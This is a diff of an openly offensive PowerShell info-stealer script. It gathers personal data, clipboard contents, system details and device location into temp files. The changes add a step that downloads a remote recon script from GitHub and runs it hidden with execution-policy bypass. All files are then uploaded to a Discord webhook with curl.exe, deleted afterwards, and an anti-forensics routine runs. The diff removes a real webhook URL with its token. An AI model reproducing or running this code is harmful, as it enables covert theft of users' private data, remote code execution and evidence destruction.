@@ -1,6 +1,8 @@
-$OutFile = "$env:USERPROFILE\Documents\personal_info.txt"
-$OutFileClip = "$env:USERPROFILE\Documents\clipboard.txt"
-$OutFilePC = "$env:USERPROFILE\Documents\pc_info.txt"
+$OutFile =      "$env:temp\personal_info.txt"
+$OutFileClip =  "$env:temp\clipboard.txt"
+$OutFilePC =    "$env:temp\pc_info.txt"
+$NetReport =    "$env:temp\network_report_full.txt"
+$NetFile =      "$env:temp\n.ps1"
 
 "==== CPU Information ====" | Out-File -Append $OutFilePC
 Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Architecture | Out-File -Append $OutFilePC
@@ -263,7 +265,7 @@ $HtmlContent = @"
 </body>
 </html>
 "@
-$HtmlPath = "$env:USERPROFILE\Documents\DeviceLocation.html"
+$HtmlPath = "$env:temp\DeviceLocation.html"
 $HtmlContent | Out-File -Encoding utf8 $HtmlPath
 
 Write-Output "System report created as System_Report.txt"
@@ -279,10 +281,13 @@ function AntiForensics {
     catch {}
 }
 
-$webhookuri = "https://discord.com/api/webhooks/1334995176321581166/3RoYJez5stb8LCsQx_4znANOdHR87FODSlI5kEXVYIwCgwT7-Cx9C-IertebeqnNC5kH"
+Invoke-WebRequest -Uri "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/recon/net_recon.ps1" -OutFile $NetFile
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$env:temp\n.ps1 -NetReport $NetReport" -Wait
 
-curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" $webhookuri
+$webhookuri = ""
 
-@($OutFile, $OutFileClip, $OutFilePC, $HtmlPath) | ForEach-Object { Remove-Item -Path $_ -Force }
+curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" -F "file5=@$NetReport" $webhookuri
+
+@($OutFile, $OutFileClip, $OutFilePC, $HtmlPath, $NetReport, $NetFile) | ForEach-Object { Remove-Item -Path $_ -Force }
 
 AntiForensics
